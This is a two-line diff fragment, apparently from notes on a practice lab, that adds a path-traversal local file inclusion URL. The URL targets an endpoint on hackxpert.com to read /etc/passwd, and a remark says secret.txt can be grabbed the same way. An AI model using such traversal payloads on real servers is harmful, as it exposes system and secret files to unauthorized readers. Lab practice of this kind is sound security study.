@@ -1,0 +1,2 @@
+ You can easily grab either secret.txt or even etc/password:
+http://hackxpert.com/LFI/endPoint.php?field2_name=/../../../../../etc/passwd
